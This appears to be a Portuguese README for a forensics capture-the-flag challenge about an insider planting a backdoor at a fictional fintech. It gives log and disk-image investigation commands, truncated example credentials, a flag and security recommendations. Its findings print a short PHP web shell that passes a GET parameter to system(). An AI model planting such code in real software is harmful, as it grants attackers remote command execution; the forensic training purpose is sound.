
### **challenges/real-cases/case-3-insider-threat/README.md**

# 🕵️ Caso 3: Insider Threat - Ameaça Interna

## Resumo do Caso
**Data do Incidente:** 05/03/2024
**Empresa Afetada:** FinTech Solutions
**Tipo:** Insider Threat (funcionário descontente)
**Impacto:** Código fonte vazado e backdoors instaladas

## 📋 Evidências Disponíveis
- [Logs de autenticação](evidence/auth.log)
- [Imagem do notebook do funcionário](evidence/laptop.dd)
- [Logs de acesso a repositório](evidence/git.log)
- [Código suspeito encontrado](evidence/backdoor.php)

## 🔍 Investigação

### 1. Análise de Logs de Autenticação

cat auth.log | grep "Failed" | grep "john.doe"

Múltiplas falhas antes de sucesso - força bruta?

2. Análise do Notebook
bash
fls -r laptop.dd | grep -i "deleted"
Arquivos recuperados:

/home/john.doe/secret_backdoor.zip

/home/john.doe/credentials.txt

3. Análise de Git
bash
cat git.log | grep "john.doe" | grep "push"
Commits suspeitos fora do horário comercial:

text
02:30 - Commit adicionando backdoor.php
03:15 - Commit removendo logs de auditoria

🔑 Descobertas

Backdoor Encontrada

php

<?php
// backdoor.php
if(isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
Credenciais Vazadas
bash
cat credentials.txt
text
aws_access_key: AKIA...
aws_secret_key: wJalrXUtnFEMI...
github_token: ghp_...

🏁 Flag do Caso

flag{insider_threat_backdoor_2024}

📝 Relatório Final

Funcionário desligado em fevereiro manteve acesso não autorizado
via backdoor instalada. Exfiltrou dados por 3 semanas.

Recomendações
Revogar acessos imediatamente após desligamento

Monitoramento de logs 24/7

2FA obrigatório

Auditoria periódica de código

Princípio do menor privilégio
